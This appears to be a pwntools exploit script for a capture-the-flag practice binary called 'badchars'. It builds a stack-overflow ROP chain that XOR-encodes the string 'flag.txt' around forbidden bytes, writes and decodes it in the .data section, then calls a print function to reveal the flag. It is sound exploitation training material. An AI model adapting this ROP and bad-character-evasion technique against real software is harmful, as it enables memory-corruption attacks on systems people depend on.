from pwn import *
from pwn import p64
import socket
from ctypes import *
context(arch='amd64', os='linux', log_level='DEBUG')
context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
# host = "node.yuzhian.com.cn"
# ip = socket.gethostbyname(host)
# r = remote(ip,37506)#远程连接
# elf = cdll.LoadLibrary('./libwrite432.so')
r = process("./badchars")

print_addr = 0x400510
mov_r13_r12 = 0x0400634
pop_r12_r13_r14_r15 = 0x040069c
xor_r15_r14 = 0x0400628
pop_r14_r15 = 0x04006a0
data_addr = 0x00601028 + 7
pop_rdi = 0x04006a3
ret = 0x4004ee

flag_string = 'flag.txt'
badchar = ['x', 'g', 'a', '.']

xor_byte = 0x1

while 1:
    flag_xor = ""
    for i in flag_string:
        i_encode = ord(i) ^ xor_byte
        if chr(i_encode) in badchar:
            xor_byte += 1  # 保证异或后没有badchar了
            break
        else:
            flag_xor += chr(i_encode)
    if len(flag_xor) == len(flag_string):
        break

print(flag_xor,xor_byte)

payload = b'A' * 0x20 + b'junkjunk'
payload += p64(pop_r12_r13_r14_r15) + flag_xor.encode() + p64(data_addr) + p64(0) + p64(0) + p64(mov_r13_r12)
# 存入到.data段

for i in range(len(flag_xor)):
    payload += p64(pop_r14_r15)
    payload += p64(xor_byte)
    payload += p64(data_addr + i)
    payload += p64(xor_r15_r14)
# 在.data中解密
payload += p64(pop_rdi) + p64(data_addr) + p64(ret) + p64(print_addr)



gdb.attach(r)
pause()

r.sendlineafter(b">", payload)

r.interactive()
